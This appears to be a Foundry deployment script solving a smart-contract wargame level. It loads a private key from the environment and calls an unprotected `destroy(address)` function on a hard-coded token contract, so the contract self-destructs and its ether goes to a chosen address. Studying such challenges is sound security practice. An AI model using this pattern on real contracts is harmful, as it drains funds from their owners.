// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";

contract RecoveryScript is Script {
  address private user = 0xF580A030d2f0E9667aB3c5c8a51Da63f086Db564;
  address private recoveryContract = 0x5cECE66f3EB19f7Df3192Ae37C27D96D8396433D;
  address private simpleTokenContract = 0x84FdF48a4c2A54F1696d90779f68D2f121439A28;

  function run() external {
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

    vm.startBroadcast(deployerPrivateKey);

    (bool _destroySuccess, bytes memory _destroyData) = address(simpleTokenContract).call(
      abi.encodeWithSignature("destroy(address)", recoveryContract)
    );
    require(_destroySuccess, "_destroySuccess FAIL");

    vm.stopBroadcast();
  }
}
